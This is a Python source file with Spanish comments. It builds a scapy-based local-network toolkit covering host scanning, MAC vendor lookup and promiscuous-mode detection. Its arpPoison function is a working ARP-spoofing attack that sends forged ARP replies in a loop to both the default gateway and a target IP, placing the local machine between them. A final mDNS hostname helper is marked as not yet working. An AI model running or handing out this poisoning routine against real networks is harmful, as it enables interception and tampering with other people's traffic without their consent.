import time

from pip._vendor import requests
from scapy.config import conf
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether, ARP, getmacbyip
import socket
from scapy.sendrecv import srp, send


# Verifica que la IP dada sea IPv4 valida.
def validIp(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

# Obtiene el proveedor de la NIC.
def proveeNic(mac):
    try:
        url ='https://www.macvendorlookup.com/oui.php?mac=%20' + mac # Devuelve un JSON con data de NIC.
        print(url)
        data = requests.get(url).json()[0]
        #print(data['company'] + ' - ' + data['country']) #DEBUG
        return data['company'] + ' - ' + data['country']
    except:
        print('error')
        return None

# Obtiene la direccion MAC de la interfaz
# por defecto del equipo local.
def obtMacLcl():
    return Ether().src


# Obtiene la direccion IP de la interfaz
# por defecto del equipo local.
def obtIpLcl():
    return ARP().psrc

# Obtiene la direccion MAC de la interfaz
# asociada a una direccion IP especificada
# por el usuario.
def obtMacIP(ip):
    # Armamos paquete ARP (who has...).
    arp = ARP(op=1, pdst=ip)

    try:
        # Regamos el paquete en la red.
        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')

        # Ejecutamos y verificamos si la respuesta
        # contiene la MAC.
        recibido, unans = srp(broadcast / arp, timeout=4, verbose=False)

        mac = unans[0].hwsrc
        return mac

    except IndexError:
        mac = getmacbyip(ip)
        if mac:
            return mac
        else:
            return None

# Dada una direccion IP, verifica si la
# NIC asociada a ella esta en modo promiscuo.
def chkPromiscIP(ip):
    # Validamos IP.
    if not validIp(ip):
        print('Dirección IP inválida...')
        return

    # Enviamos paquete ARP a direccion IP especificada,
    # asociando a esta una direccion MAC practicamente
    # invalida.
    resp = srp(Ether(dst='ff:ff:ff:ff:ff:fe')/ARP(pdst=ip), timeout=3, verbose=False)[0]

    # Si hay una respuesta, modo promiscuo esta activado.w
    if resp:
        print('Modo promiscuo activo.')
    else:
        print('Modo promiscuo inactivo.')


# Devuelve la ip de default gateway local.
def defGate():
    try:
        return conf.route.route("0.0.0.0")[2]
    except:
        return None

# Escanea todos los hosts de la red local y los imprime en una lista.
def escanHostsLcl():
    try:
        ip = IP().src
    except:
        print('Parece no estar conectado a una red...')
        return

    # Anadimos subnet mask.
    ip += '/24'
    # Paquete ARP (who has...)
    arp = ARP(pdst=ip)
    # Paquete para regar en toda la red.
    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
    # Paquete para enviar.
    pack = broadcast / arp

    resp = srp(pack, timeout=3, verbose=False)[0]

    hosts = []
    for enviado, recibido in resp:
        hosts.append({'ip':recibido.psrc, 'mac':recibido.hwsrc})

    # Mostramos hosts.
    print(f'{len(hosts)} detectados:')
    for a in hosts:
        print(f'{a["ip"]} - {a["mac"]}')


# Genera ARP poisoning en equipo con IP dst especificada .
def arpPoison(dst):
    # IP de default gateway (gw).
    gw = defGate()
    if not gw:
        print('No se pudo obtener la IP de default gateway...')
        exit(-1)

    # MAC de gw.
    gwMac = obtMacIP(gw)
    print(gwMac)
    if not gwMac:
        print('No se pudo obtener la MAC de default gateway...')
        exit(-1)

    # IP local.
    lclIp = obtIpLcl()
    if not lclIp:
        print('No se pudo obtener la IP local...')
        exit(-1)

    # MAC local.
    lclMac = obtMacLcl()
    if not lclMac:
        print('No se pudo obtener la MAC local...')
        exit(-1)

    print(gw + ' ' + gwMac + ' ' + lclIp + ' ' + lclMac)
    # Verificamos validez de IP dst.
    if not validIp(dst):
        print(u'IP dst inválida...')
        exit(-1)

    # Obtenemos MAC de IP dst.
    dstMac = obtMacIP(dst)

    if not dstMac:
        print('No se pudo obtener la MAC de dst...')
        exit(-1)

    arpA = ARP(op=2, psrc=dst, hwsrc=lclMac, pdst=gw, hwdst=gwMac)
    arpB = ARP(op=2, psrc=gw, hwsrc=lclMac, pdst=dst, hwdst=dstMac)
    arpA.show()
    arpB.show()
    while True:
        try:
            send(arpA)
            send(arpB)
        except KeyboardInterrupt:
            exit(0)

        time.sleep(7)


# Obtiene el hostname de una IP
# TODAVIA NO FUNCIONA
def hostnameXIp(ip):
    PORT = 5353 # Multicast DNS
    for i in range(2): # intente dos veces
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # IPv4, UDP
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Habilitamos reutilizacion de IP
            s.bind(('224.0.0.251', PORT))
            s.sendall(b'224.0.0.251')
            print('llega')
            data = s.recv(1024)
            print('Received', repr(data))
            s.close()
            break
        except:
            return None